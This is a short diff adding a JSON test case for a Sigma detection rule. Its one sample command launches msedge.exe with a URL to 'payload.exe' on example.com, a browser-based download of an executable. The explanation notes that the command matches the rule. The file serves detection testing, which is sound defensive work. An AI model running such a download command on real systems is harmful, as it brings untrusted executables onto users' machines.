@@ -1,0 +1,6 @@
+[
+  {
+    "output": "msedge.exe http://example.com/payload.exe --window-size=800,600",
+    "explanation": "This command is already a valid test case for the Sigma rule. It uses a browser process with a URL argument pointing to a file with an executable extension (.exe)."
+  }
+]
